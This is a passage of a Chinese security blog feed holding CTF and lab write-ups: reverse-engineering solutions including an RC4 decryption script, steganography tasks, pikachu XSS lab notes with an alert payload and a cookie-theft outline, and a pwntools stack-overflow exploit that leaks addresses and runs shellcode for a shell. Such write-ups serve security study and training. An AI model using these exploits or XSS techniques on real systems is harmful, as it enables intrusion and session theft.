1, 1, 0, 0, 0, 0, 0, 0]</span><br><span class="hljs-string">[1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0]</span><br><span class="hljs-string">[1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0]</span><br><span class="hljs-string">[1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0]</span><br><span class="hljs-string">[1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0]</span><br><span class="hljs-string">[1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0]</span><br><span class="hljs-string">[1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0]</span><br><span class="hljs-string">[1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0]</span><br><span class="hljs-string">[1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0]</span><br><span class="hljs-string">[1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0]</span><br><span class="hljs-string">[1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0]</span><br><span class="hljs-string">[1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 4, 0]</span><br><span class="hljs-string">[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]</span><br><span class="hljs-string">[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]</span><br>第三个迷宫<br><span class="hljs-string">[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]</span><br><span class="hljs-string">[0, 3, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]</span><br><span class="hljs-string">[0, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0]</span><br><span class="hljs-string">[0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0]</span><br><span class="hljs-string">[0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0]</span><br><span class="hljs-string">[0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0]</span><br><span class="hljs-string">[0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0]</span><br><span class="hljs-string">[0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0]</span><br><span class="hljs-string">[0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0]</span><br><span class="hljs-string">[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0]</span><br><span class="hljs-string">[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0]</span><br><span class="hljs-string">[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0]</span><br><span class="hljs-string">[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0]</span><br><span class="hljs-string">[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0]</span><br><span class="hljs-string">[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 4, 0]</span><br></code></pre></td></tr></tbody></table></figure><p>懒得弄了直接找了网上处理好的地图。</p><p>3是起点，4是终点，1可走，0不可走</p><pre><code class="hljs">ddsssddddsssdssdddddsssddddsssaassssdddsddssddwddssssssdddssssdddssflag{aeea66fcac7fa80ed8f79f38ad5bb953}</code></pre><h1 id="1000Click"><a href="#1000Click" class="headerlink" title="1000Click"></a>1000Click</h1><p>ida打开，好家伙一堆假flag，其中发现一个Text db:</p><p><img src="https://s2.loli.net/2023/01/31/TPfSNznAuUsDmZy.png" alt="图片.png"></p><p>填入，弹出Success!</p><pre><code class="hljs">flag{TIBntXVbdZ4Z9VRtoOQ2wRlvDNIjQ8Ra}</code></pre><p>简单分析一下函数：</p><pre><code class="hljs">void __thiscall sub_402790(CWnd *this){    ++*((_DWORD *)this + 53);CWnd::UpdateData(this, 0);if ( *((_DWORD *)this + 53) == 1000 ){CWnd::MessageBoxA(this, Text, "msg", 0);PostQuitMessage(0);}}</code></pre><p>就是<code>this+53==1000</code>弹出Text……</p><h1 id="crypt"><a href="#crypt" class="headerlink" title="crypt"></a>crypt</h1><p>不是PE文件，ida看一下</p><p><img src="https://s2.loli.net/2023/01/31/aKOH6woyPJljxrt.png" alt="图片.png"></p><p>分析不太明白，看了一下大佬的wp</p><p>分析main函数：</p><pre><code class="hljs">int __cdecl main(int argc, const char **argv, const char **envp){int v3; // eaxunsigned int v4; // eaxvoid *v5; // raxvoid *v7; // raxint i; // [rsp+24h] [rbp-D4h]_DWORD *v9; // [rsp+28h] [rbp-D0h]char v10[32]; // [rsp+30h] [rbp-C8h] BYREFchar Str[128]; // [rsp+50h] [rbp-A8h] BYREFstrcpy(Str, "12345678abcdefghijklmnopqrspxyz");// Str赋值memset(&amp;Str[32], 0, 0x60ui64);memset(v10, 0, 0x17ui64);scanf("%s", v10);v9 = malloc(0x408ui64);                       // v9用于加密v3 = strlen(Str);sub_140001120(v9, (__int64)Str, v3);          // 加密v4 = strlen(v10);sub_140001240(v9, v10, v4);                   // 加密for ( i = 0; i &lt; 22; ++i )                    // 加密后的值依次比较{  if ( ((unsigned __int8)v10[i] ^ 0x22) != byte_14013B000[i] )// 不相等则error  {    v5 = (void *)sub_1400015A0((__int64)&amp;off_14013B020, (__int64)"error");    _CallMemberFunction0(v5, (void (__fastcall *)(void *))sub_140001F10);    return 0;  }}v7 = (void *)sub_1400015A0((__int64)&amp;off_14013B020, (__int64)"nice job");_CallMemberFunction0(v7, (void (__fastcall *)(void *))sub_140001F10);return 0;}</code></pre><p>看一下加密函数sub_140001120</p><p><img src="https://s2.loli.net/2023/01/31/y1VFoxqb7A3s2nj.png" alt="图片.png"></p><p>观察到有256次循环，明显的RC4算法特征。</p><blockquote><p>RC4:密钥长度可变的流加密算法簇,用于无线通信网络,通过算法一次一个字节的加密消息,使用64位或128位密钥大小,是一种典型的对称加密算法;<br>密钥长度可变,一般用256个字节</p></blockquote><h2 id="逻辑梳理"><a href="#逻辑梳理" class="headerlink" title="逻辑梳理"></a>逻辑梳理</h2><ol><li>输入一个值</li><li>RC4加密(密钥为Str)</li><li>异或0x22</li><li>用密钥(Str)RC4解密</li><li>得到明文即为flag</li></ol><p>可得逆向逻辑:</p><ol><li><p>获取bype_14013B000的值</p></li><li><p>异或0x22</p></li><li><p>用已知密钥RC4解密</p></li><li><p>得到flag</p><p> byte_14013B000=0x9E, 0xE7, 0x30, 0x5F, 0xA7, 0x1, 0xA6, 0x53, 0x59, 0x1Bh, 0xA, 0x20, 0xF1, 0x73, 0xD1, 0xE, 0xAB, 0x9, 0x84, 0xE, 0x8D, 0x2B,0x00,0x00</p></li></ol><p>大佬的exp:</p><figure class="highlight smali"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs smali">r = <span class="hljs-string">"12345678abcdefghijklmnopqrspxyz"</span><br>v9 = []  <span class="hljs-comment"># 该数组为用于加密的数组               # sub_140001120函数</span><br>for i in range(256):<br>        v9.append(i)<br>a3 = len(str)<br>v6 = 0<br>v7 = 0<br>v8 = 0<br>for j in range(256):  <span class="hljs-comment"># 使用str生成v9数组</span><br>        v8 = v9[j]<br>        v7 = ((ord(str[v6]) &amp; 0xff) + v8 + v7) &amp; 0xff<br>        v9[j] = v9[v7]<br>        v9[v7] = v8<br>        v6 += 1<br>       <span class="hljs-built_in"> if </span>v6 &gt;= a3:<br>                v6 = 0<br>flag1 = []      <span class="hljs-comment"># 伪flag,字符串在sub_140001240函数中被做了加密</span><br>key1 = [0x9E, 0x0E7, 0x30, 0x5F, 0x0A7, 0x1, 0x0A6, 0x53, 0x59, 0x1B, 0x0A, 0x20, 0x0F1, 0x73, 0x0D1, 0x0E, 0x0AB, 0x9, 0x84, 0x0E, 0x8D, 0x2B, 0x00, 0x00]<br>for i in range(22):<br>        flag1.append(key1[i] ^ 0x22)    <span class="hljs-comment"># 得到伪flag</span><br>flag = []<br>v5 = 0<br>v6 = 0<br>for i in range(22):             <span class="hljs-comment"># sub_140001240逆向解密</span><br>        v5 = (v5 + 1) &amp; 0xff<br>        v7 = v9[v5]<br>        v6 = (v7 + v6) &amp; 0xff<br>        v8 = v9[v6]<br>        v9[v5] = v8<br>        v9[v6] = v7<br>        flag.append(flag1[i] ^ ((v9[(v8+v7)&amp;0xff]) &amp; 0xff))<br>for i in range(22):<br>        print(chr(flag[i]),end=<span class="hljs-string">""</span>)<br></code></pre></td></tr></tbody></table></figure><pre><code class="hljs">flag{nice_to_meet_you}</code></pre><p>或者ida远程动态调试,我发现我的ida没有linux远程调试功能,可能是版本问题,懒得弄了.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;easyRE1&quot;&gt;&lt;a href=&quot;#easyRE1&quot; class=&quot;headerlink&quot; title=&quot;easyRE1&quot;&gt;&lt;/a&gt;easyRE1&lt;/h1&gt;&lt;p&gt;下载附件有俩文件，先看一下32位的。&lt;/p&gt;
&lt;p&gt;直接给出了&lt;/p&gt;
&lt;pre&gt;&lt;code cla</summary>
      
    
    
    
    
    <category term="RE" scheme="https://sinky.top/tags/RE/"/>
    
    <category term="CTF" scheme="https://sinky.top/tags/CTF/"/>
    
    <category term="攻防世界" scheme="https://sinky.top/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界CTF-Misc3</title>
    <link href="https://sinky.top/2023/01/19/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCTF-Misc3/"/>
    <id>https://sinky.top/2023/01/19/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCTF-Misc3/</id>
    <published>2023-01-19T01:20:31.781Z</published>
    <updated>2023-02-21T01:27:14.287Z</updated>
    
    <content type="html"><![CDATA[<p>菜鸟又来刷题了，这网可是真慢啊……</p><h1 id="pure-color"><a href="#pure-color" class="headerlink" title="pure_color"></a>pure_color</h1><p>打开是一个空白图片，用Stegsolve打开试试</p><p>打开，点了→，不对，点←，直接出来了。</p><p><img src="https://s2.loli.net/2023/01/19/43PBldbfpRzAtMy.png" alt="图片.png"></p><h1 id="2017-Dating-in-Singapore"><a href="#2017-Dating-in-Singapore" class="headerlink" title="2017_Dating_in_Singapore"></a>2017_Dating_in_Singapore</h1><p>题目描述：</p><pre><code class="hljs">01081522291516170310172431-050607132027262728-0102030209162330-02091623020310090910172423-02010814222930-0605041118252627-0203040310172431-0102030108152229151617-04050604111825181920-0108152229303124171003-261912052028211407-04051213192625</code></pre><p>打开附件是个日历</p><p><img src="https://s2.loli.net/2023/01/19/eBJXZERnbYvIFLH.png" alt="图片.png"></p><p>可能是对应着日期，将数字两两分隔</p><pre><code class="hljs">01 08 15 22 29 15 16 17 03 10 17 24 3105 06 07 13 20 27 26 27 2801 02 03 02 09 16 23 3002 09 16 23 02 03 10 09 09 10 17 24 2302 01 08 14 22 29 3006 05 04 11 18 25 26 2702 03 04 03 10 17 24 3101 02 03 01 08 15 22 29 15 16 1704 05 06 04 11 18 25 18 19 2001 08 15 22 29 30 31 24 17 10 0326 19 12 05 20 28 21 14 0704 05 12 13 19 26 25</code></pre><p>与日历对应，画图：</p><p><img src="https://s2.loli.net/2023/01/19/VxYd5i7Tq4QvPOn.png" alt="图片.png"></p><pre><code class="hljs">flag: HITB{CTFFUN}</code></pre><h1 id="simple-transfer"><a href="#simple-transfer" class="headerlink" title="simple_transfer"></a>simple_transfer</h1><p>题目描述:文件里有flag，找到它。</p><p>是一个流量包后缀，拿wirshark打开看看</p><p>选择统计-&gt;协议分级</p><p><img src="https://s2.loli.net/2023/01/19/GixOdC4BzSrvajQ.png" alt="图片.png"></p><p>dlep占比94.2，过滤delp,右键作为过滤器使用，选中。</p><p>全是<code>Message:Unknown</code></p><p>不知道，扔进binwalk看一下</p><p><img src="https://s2.loli.net/2023/01/19/brw4p1lOBGS72Nf.png" alt="图片.png"></p><p>哦莫，有个pdf文件，分离一下：</p><pre><code class="hljs">binwalk -e 文件名</code></pre><p><img src="https://s2.loli.net/2023/01/19/z4XBrsxeYmIdg5c.png" alt="图片.png"></p><pre><code class="hljs">flag: HITB{b3d0e380e9c39352c667307d010775ca}</code></pre><p>后来发现pdf文件直接也有……</p><p><img src="https://s2.loli.net/2023/01/19/gFTcW7dP6RAD2S4.png" alt="图片.png"></p><h1 id="Training-Stegano-1"><a href="#Training-Stegano-1" class="headerlink" title="Training_Stegano_1"></a>Training_Stegano_1</h1><p>题目描述:这是我能想到的最基础的图片隐写术</p><p>下载，是一个bmp文件</p><p><img src="https://s2.loli.net/2023/01/19/vWCuZ9lMfcgx15y.png" alt="图片.png"></p><p>扔进Stegsolve中，看不清，太小了。</p><p>用winhex打开看看</p><p><img src="https://s2.loli.net/2023/01/19/oOpxFST6HhmDnbC.png" alt="图片.png"></p><p>有字符串：<code>Look what the hex-edit revealed: passwd:steganoI</code></p><pre><code class="hljs">flag: steganoI</code></pre><h1 id="can-has-stdio"><a href="#can-has-stdio" class="headerlink" title="can_has_stdio?"></a>can_has_stdio?</h1><p>下载附件，不是个PE文件</p><p><img src="https://s2.loli.net/2023/01/19/HmYgy8BJ32oPRFb.png" alt="图片.png"></p><p>kali打开，是一个五角星（内心os: 五星红旗迎风飘扬~~）</p><p>不知道是啥，看起来应该是什么加密方式吧，直接复制一部分百度搜一下，发现为BrainFuck语言</p><p>找个在线解码的网站：</p><p><img src="https://s2.loli.net/2023/01/19/C6GVIDToE8vndOQ.png" alt="图片.png"></p><pre><code class="hljs">flag{esolangs_for_fun_and_profit}</code></pre><h1 id="Erik-Baleog-and-Olaf"><a href="#Erik-Baleog-and-Olaf" class="headerlink" title="Erik_Baleog_and_Olaf"></a>Erik_Baleog_and_Olaf</h1><p>下载不知道是啥，扔winhex看是png，结尾还有个东西</p><p><img src="https://s2.loli.net/2023/01/19/om7rhfOMgi3vNYA.png" alt="图片.png"></p><p>一个网站：<a href="http://i.imgur.com/22kUrzm.png">http://i.imgur.com/22kUrzm.png</a></p><p>改后缀为png</p><p><img src="https://s2.loli.net/2023/01/19/fxHCRwU3BsuihTj.png" alt="图片.png"></p><p>扔到stegsolve看，发现一个二维码</p><p><img src="https://s2.loli.net/2023/01/19/6Xh97vHndPBas3m.png" alt="图片.png"></p><p>但是二维码不全</p><p>看一下那个网站的图片，应该拼起来扫二维码的，那个网站访问不了了……</p><p>倔驴只能重新打开stegsolve看看找找了</p><p>wp说在random color map 1/2/3找到了最清晰的二维码</p><p>找不到，放弃！！！</p><h1 id="Janos-the-Ripper"><a href="#Janos-the-Ripper" class="headerlink" title="János_the_Ripper"></a>János_the_Ripper</h1><p>下载，解压，然后扔到notepad++里瞅瞅，发现有个flag.txt，改后缀为rar</p><p>需要密码，直接用ARCHPR暴力破解。</p><p><img src="https://s2.loli.net/2023/02/17/bqIVatRTl3eGSLA.png" alt="图片.png"></p><p>密码fish。<br>拿到flag!</p><pre><code class="hljs">flag{ev3n::y0u::bru7us?!}</code></pre><h1 id="Test-flag-please-ignore"><a href="#Test-flag-please-ignore" class="headerlink" title="Test_flag_please_ignore"></a>Test_flag_please_ignore</h1><p>下载扔进notepad,看见一串密文，像十六进制，转文本拿到flag</p><h1 id="hong"><a href="#hong" class="headerlink" title="hong"></a>hong</h1><p>是一个音频，但是播放不了。</p><p>扔进kali</p><pre><code class="hljs">file hong.mp3 # hong.mp3: data 不是mp3文件binwalk -e hong.mp3 # 分离一下看看</code></pre><p><img src="https://s2.loli.net/2023/02/17/HrCRP8gjFpSevAX.png" alt="图片.png"></p><p>看到有两个图片，dd分离出来</p><pre><code class="hljs">dd if=hong.mp3 of=hong1.jpg skip=82483 bs=1dd if=hong.mp3 of=hong2.jpg skip=138170 bs=1</code></pre><blockquote><p>在做隐写题时，dd命令可以拆分文件，<br><code>dd if=源文件 of=输出文件1 count=指定要提取的文件大小 bs=块大小</code><br><code>dd if=源文件 of=输出文件2 skip=前一个文件的大小（是文件2的偏移量） bs=块大小</code></p></blockquote><p>提取出来俩图，其中一个直接给了flag</p><p><img src="https://s2.loli.net/2023/02/17/xwOvEFR6qcMmead.png" alt="图片.png"></p><h1 id="misc-pic-again"><a href="#misc-pic-again" class="headerlink" title="misc_pic_again"></a>misc_pic_again</h1><p>一张图片，kali看一下，没有线索，扔进stegsolve里，也没啥效果，看wp</p><p>讲Red Green Blue都勾选为0，发现文件显示PK头，保存为zip文件。</p><p><img src="https://s2.loli.net/2023/02/17/UE85Rm6hoOHGbvM.png" alt="图片.png"></p><p>解压，扔进winhex看一下，发现flag</p><p><img src="https://s2.loli.net/2023/02/17/sB8oNdtgfr7Qea5.png" alt="图片.png"></p><h1 id="reverseMe"><a href="#reverseMe" class="headerlink" title="reverseMe"></a>reverseMe</h1><p>图片，直接给了flag的镜像，用手机相册直接镜像回来：</p><p><img src="https://s2.loli.net/2023/02/17/TNXmuqSOKlRnjy9.png" alt="图片.png"></p><pre><code class="hljs">flag{4f7548f93c7bef1dc6a0542cf04e796e}</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;菜鸟又来刷题了，这网可是真慢啊……&lt;/p&gt;
&lt;h1 id=&quot;pure-color&quot;&gt;&lt;a href=&quot;#pure-color&quot; class=&quot;headerlink&quot; title=&quot;pure_color&quot;&gt;&lt;/a&gt;pure_color&lt;/h1&gt;&lt;p&gt;打开是一个空白图片，用St</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://sinky.top/tags/CTF/"/>
    
    <category term="攻防世界" scheme="https://sinky.top/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    <category term="Misc" scheme="https://sinky.top/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>pikachu-XSS</title>
    <link href="https://sinky.top/2023/01/17/pikachu-XSS/"/>
    <id>https://sinky.top/2023/01/17/pikachu-XSS/</id>
    <published>2023-01-17T01:57:25.232Z</published>
    <updated>2023-02-21T01:27:14.276Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XSS概述"><a href="#XSS概述" class="headerlink" title="XSS概述"></a>XSS概述</h1><p>成因：没有对web前端的输入边界严格过滤，造成攻击者可以通过构造脚本语言使得输入的内容被当成正常的html来执行，从而产生危害，xss主要危害前端用户，并可以用于进行钓鱼，前端js挖矿，用户cookie获取、甚至可以结合浏览器自身的漏洞对主机进行远程控制。</p><h2 id="xss窃取cookie攻击流程"><a href="#xss窃取cookie攻击流程" class="headerlink" title="xss窃取cookie攻击流程"></a>xss窃取cookie攻击流程</h2><ol><li>攻击者发现存在xss漏洞的站点插入js脚本等待用户访问</li><li>用户访问xss页面，触发脚本，返回带有恶意js的页面</li><li>执行脚本，发送窃取数据（cookie）到攻击者</li><li>伪造用户登录，造成破坏</li></ol><h2 id="常见类型"><a href="#常见类型" class="headerlink" title="常见类型"></a>常见类型</h2><ul><li>反射型：交互数据一般不会被存在数据库里，一次性所见即所得，一般出现在查询类页面等</li><li>存储型：交互的数据被存储在数据库里，永久性存储，一般出现在留言板、注册等页面</li><li>DOM型：不与后台服务器产生数据交互，是一种通过DOM操作前端代码输出的时候产生的问题，一次性，也属于反射型一种。</li></ul><h2 id="xss漏洞测试流程"><a href="#xss漏洞测试流程" class="headerlink" title="xss漏洞测试流程"></a>xss漏洞测试流程</h2><ol><li>在目标站点上找到输入点，如查询接口、留言板等</li><li>输入一组“特殊字符+唯一识别字符”，点击提交后查看返回的源码，是都有对应的处理</li><li>通过搜索定位到唯一字符，结合唯一字符前后</li></ol><h2 id="反射型xss-get"><a href="#反射型xss-get" class="headerlink" title="反射型xss(get)"></a>反射型xss(get)</h2><p>随便输入，返回<code>who is &gt;&gt;&gt;,i don't care!</code></p><p>看一下源代码</p><p><img src="https://s2.loli.net/2023/01/31/TKemsZJ8zu6XrqN.png" alt="图片.png"></p><p>可以构造执行js（构造闭合）<br>限制输入字符长度为20，可以直接在网址框输入xss语句<code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></p><p><img src="https://s2.loli.net/2023/01/31/Y1Q9Nwx68KD3TSi.png" alt="图片.png"></p><p>发现可以解析，即存在xss漏洞，可以利用此漏洞获取用户cookie。</p><p>漏洞利用我失败了，不知道什么原因，跟着教程做的也不对，先不弄了。</p><p>XSS是利用网站的输入接口进行攻击，在前期通过各种特殊字符进行试探后，若是符合攻击的条件，就进行js恶意代码的编写，注入到输入接口之后，获取url将其发送给受害者，即可进行攻击</p><h2 id="反射型xss-post"><a href="#反射型xss-post" class="headerlink" title="反射型xss(post)"></a>反射型xss(post)</h2><p>登录后直接在输入框输入构造的js代码会出现弹窗。</p><p>看一下源代码，发现输入字符串直接嵌入p标签中，意味着我们可以尝试写入特制js代码</p><p><img src="https://s2.loli.net/2023/02/01/euRjUM8mKDFGahQ.png" alt="image.png"></p><p>因为网址输入口的url没有我们输入的内容，所以不能用get的方式去攻击</p><p><img src="https://s2.loli.net/2023/02/01/iG1Tu7vQS5dZPNJ.png" alt="image.png"></p><h2 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h2><p>输入过的字符都会被存储写在p标签里，输入xss语句发现弹出窗口。</p><p>存储型xss:交互的数据都会被存在数据库里，永久性存储，一般出现在留言板，注册等页面。</p><p>自我们输入xss语句之后，每次刷新都会弹出xss弹窗，说明js代码被存储到数据库中，每次访问这个页面都会执行一遍。</p><p>利用我是真不会。</p><h2 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h2><p>DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分，通过DOM可以让脚本动态的访问、控制网页，通过js去对网页进行修改，变化执行才产生的xss漏洞。</p><p>Dom是将代码插入到本地浏览器的前端代码里面，而反射和存储是经过后端，并且反射后端遇到就会执行，存储型也经过，但是会把数据持久性的存储到服务器上。</p><p><img src="https://s2.loli.net/2023/02/01/kBafmhedXxFDRyz.png" alt="image.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XSS概述&quot;&gt;&lt;a href=&quot;#XSS概述&quot; class=&quot;headerlink&quot; title=&quot;XSS概述&quot;&gt;&lt;/a&gt;XSS概述&lt;/h1&gt;&lt;p&gt;成因：没有对web前端的输入边界严格过滤，造成攻击者可以通过构造脚本语言使得输入的内容被当成正常的html来执行，从</summary>
      
    
    
    
    
    <category term="pikachu" scheme="https://sinky.top/tags/pikachu/"/>
    
    <category term="靶场" scheme="https://sinky.top/tags/%E9%9D%B6%E5%9C%BA/"/>
    
    <category term="XSS" scheme="https://sinky.top/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-repeater</title>
    <link href="https://sinky.top/2023/01/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-repeater/"/>
    <id>https://sinky.top/2023/01/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-repeater/</id>
    <published>2023-01-11T02:36:01.322Z</published>
    <updated>2023-01-12T08:55:30.524Z</updated>
    
    <content type="html"><![CDATA[<h1 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h1><p><img src="https://s2.loli.net/2023/01/11/jMOrbuUX61ETSVP.png" alt="image.png"></p><p>64位文件；Full RELRO:got表不可写，无法被覆盖；没开栈保护；没开NX,可以执行内存；开了地址内存随机化；RWX:可读可写可执行</p><p>不知道，看一下ida</p><h1 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h1><p>先看一下主函数：</p><p><img src="https://s2.loli.net/2023/01/12/WnlmLo5TZzdgxju.png" alt="image.png"></p><p>s大小为0x20，但read()读入0x40长度数据，造成栈溢出。地址起始于[rbp-30h]</p><p>v5控制循环，条件输出main函数地址。</p><p>通过s溢出可控制变量v5的值及函数返回地址</p><pre><code class="hljs">memset(byte_202040, 0, sizeof(byte_202040)); # 初始化内存，将byte_202040设为0sub_982(byte_202040, 48LL); # 读取输入内容到byte_202040，因为没开NX,所以可以写入shellcode</code></pre><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>程序运行开始，输入name时候，输入一段shellcode，通过s溢出控制v5值为3281697，泄露main函数地址。</p><p>通过main函数地址及byte_202040（就是在bss段的202040处）与main地址偏移，获取shellcode代码地址。</p><p>构造溢出输入，覆盖返回地址，使程序跳转到shellcode执行获取系统shell。</p><p>开启PIE保护后无法获取函数地址，只有偏移，main函数偏移为0xa33</p><p><img src="https://s2.loli.net/2023/01/12/rcV5PXqUDkvmNj1.png" alt="image.png"></p><p>所以：基地址=main函数地址-main函数偏移</p><p>则shellcode地址=基地址+0x202040</p><p>s与v5相差0x20h,可根据此对v5进行修改。</p><p><img src="https://s2.loli.net/2023/01/12/CMLBOpPgRHD2teJ.png" alt="image.png"></p><p>第一次输入shellcode；第二次输入修改v5值输出main函数地址，计算基地址；第三次输入将v5改为0跳出循环，利用栈溢出劫持程序执行shellcode</p><h2 id="拓展：PIE保护"><a href="#拓展：PIE保护" class="headerlink" title="拓展：PIE保护"></a>拓展：PIE保护</h2><p>PIE：地址无关可执行文件，针对代码段.text,数据段.*data，.bss等固定地址的一个防护技术，同ASLR一样，应用了PIE的程序会在每次加载时变换加载基址，从而使位于程序本身的gadget也失效，没有PIE保护的程序，每次加载基址都是固定的（64位一般为0x400000），开启PIE保护，基址会变化。</p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><pre><code class="hljs">from pwn import *context(os='linux',arch='amd64',log_level='debug') # context是pwntools用于设置环境的功能，由于二进制文件情况不同，需要进行环境设置才能正常运行expp=remote('61.147.171.105',58537)// 通过输入name向bss段写入shellcodeshellcode=asm(shellcraft.sh()) # pwntools自动生成shellcodep.sendlineafter("Please give me your name :",shellcode)// 通过输入内容溢出修改控制变量值，泄露main地址payload=b'a'*0x20+p64(3281697) # 填充0x20的垃圾，覆盖v5为3281697p.sendlineafter("input :",payload)p.readuntil(b'But there is gift for you :\n')main_addr=int(p.recvuntil("\n"),16) # 接收16字节数据// 再次通过输入内容溢出，将函数返回地址改为shellcode地址base_addr=main_addr-0xa33 # 计算基地址payload=b'a'*0x20+p64(0)+p64(0xaaaabbbb)+p64(0xaaaabbbb)+p64(base_addr+0x202040) # 填充0x20垃圾，v5覆盖为0，再继续填充16字节的垃圾，覆盖返回地址为shellcode地址p.sendlineafter("input :",payload)p.interactive()</code></pre><ul><li>asm(shellcraft.sh())//默认产生一个32位的shell</li><li>asm(shellcraft.amd64.sh())//可以产生一个64位的shell</li><li>context(os=’linux’, arch=’amd64’, log_level=’debug’)//主要设置arch=amd64<ul><li>os设置系统为linux系统,大多数pwn题目的系统都是linux</li><li>arch设置为amd64，可以简单的认为设置为64位的模式，对应的32位模式是’i386’</li><li>log_level设置日志输出的等级为debug，这句话在调试的时候一般会设置，这样pwntools会将完整的io过程都打印下来，使得调试更加方便</li></ul></li></ul><h1 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h1><p>我不太明白为什么在改变了变量数值之后，要再填充两个8字节垃圾数据去对齐覆盖返回地址。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;checksec&quot;&gt;&lt;a href=&quot;#checksec&quot; class=&quot;headerlink&quot; title=&quot;checksec&quot;&gt;&lt;/a&gt;checksec&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://s2.loli.net/2023/01/11/jMOrb</summary>
      
    
    
    
    
    <category term="PWN" scheme="https://sinky.top/tags/PWN/"/>
    
    <category term="CTF" scheme="https://sinky.top/tags/CTF/"/>
    
    <category term="攻防世界" scheme="https://sinky.top/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-pwnstack</title>
    <link href="https://sinky.top/2023/01/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-pwnstack/"/>
    <id>https://sinky.top/2023/01/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-pwnstack/</id>
    <published>2023-01-11T01:15:00.929Z</published>
    <updated>2023-01-11T05:32:15.148Z</updated>
    
